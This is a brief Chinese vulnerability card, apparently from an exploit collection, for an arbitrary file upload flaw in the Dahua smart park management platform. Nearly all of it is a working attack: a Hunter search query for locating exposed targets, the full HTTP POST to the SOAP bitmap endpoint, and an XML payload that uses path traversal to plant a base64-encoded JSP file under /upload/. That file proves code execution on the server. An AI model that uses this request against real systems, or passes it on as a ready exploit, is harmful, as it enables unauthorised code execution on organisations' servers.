# 大华智慧园区综合管理平台bitmap任意文件上传漏洞

- **系统**：大华　|　**类型**：文件上传　|　**CVE**：—
- **指纹**：`hunter:`app.name="Dahua 大华 智慧园区管理平台"`\`
- **请求**：`POST /emap/webservice/gis/soap/bitmap HTTP/1.1`
- **关键头**：`Cookie: JSESSIONID=C30EF0C843ACBDC71597DEE0CBDADE8C`　`Sec-Fetch-User: ?1`　`Content-Type: text/xml;charset=UTF-8`　`Content-Length: 628`

**请求体 / payload**
```
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:res="http://response.webservice.bitmap.mapbiz.emap.dahuatech.com/">
<soapenv:Header/>
<soapenv:Body>
<res:uploadPicFile>
<arg0>
<picName>stc.jsp</picName>
<!--type: string-->
<picPath>/../stc.jsp</picPath>
</arg0>
<!--type: base64Binary-->
<arg1>PCVvdXQucHJpbnQoOTk5Kjk5OSk7bmV3IGphdmEuaW8uRmlsZShhcHBsaWNhdGlvbi5nZXRSZWFsUGF0aChyZXF1ZXN0LmdldFNlcnZsZXRQYXRoKCkpKS5kZWxldGUoKTslPg==</arg1>
</res:uploadPicFile>
</soapenv:Body>
</soapenv:Envelope>

上传文件位置
/upload/stc.jsp
```

**其他**
- 大华智慧园区综合管理平台bitmap任意文件上传漏洞: * 一、漏洞描述
* 二、影响版本
* 三、资产测绘
* 四、漏洞复现
***
- 版本: * 大华智慧园区综合管理平台